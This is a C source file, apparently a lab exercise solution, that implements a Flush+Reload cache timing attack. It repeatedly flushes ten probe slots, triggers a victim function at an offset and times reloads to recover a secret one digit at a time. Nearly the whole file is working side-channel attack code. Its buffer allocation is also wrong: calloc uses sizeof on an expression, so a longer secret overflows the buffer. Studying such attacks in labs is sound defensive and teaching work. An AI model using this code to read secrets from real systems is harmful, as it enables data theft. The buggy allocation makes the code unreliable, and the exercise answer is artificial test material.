#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <stdlib.h>
#include "common.h"
#include "cacheutils.h"

extern void run_victim(size_t idx);
extern size_t secret_len;
extern uint8_t shared_array[];

#define REPEAT 1

int main(void) {

    uint8_t *guessed_secret = calloc(sizeof(secret_len + 1), sizeof(uint8_t));

    /* BEGIN_SOLUTION */

    for (size_t idx = 0; idx < secret_len; idx++) {
        uint64_t times[10][REPEAT] = {0};

        for (int r = 0; r < REPEAT; r++) {
            // 1) Flush all digit slots
            for (int d = 0; d < 10; d++) {
                flush(&shared_array[(d + '0') * PROBE_SCALE]);
            }

            // 2) Victim accesses the secret digit at position pos
            run_victim(idx + 16);  // offset to read secret

            // 3) Probe all 10 digits
            for (int d = 0; d < 10; d++) {
                void *addr = &shared_array[(d + '0') * PROBE_SCALE];
                times[d][r] = reload(addr);
            }
        }

        // Compute medians per digit
        uint64_t medians[10];
        for (int d = 0; d < 10; d++) {
            compute_median(times[d], REPEAT, &medians[d]);
        }

        // Pick digit with lowest median as the recovered secret digit
        int best_digit = -1;
        uint64_t best_med = (uint64_t)-1;
        for (int d = 0; d < 10; d++) {
            if (medians[d] < best_med) {
                best_med = medians[d];
                best_digit = d;
            }
        }

        // Debug print for this position
        printf("\n=== Index %zu ===\n", idx);
        for (int d = 0; d < 10; d++) {
            printf("digit %c: median=%lu%s\n",
                   '0' + d, medians[d], (d == best_digit ? " <-- best" : ""));
        }
        guessed_secret[idx] = '0' + best_digit;
    }

    /* END_SOLUTION */

    printf("Recovered secret = %s\n", guessed_secret);

    return 0;
}
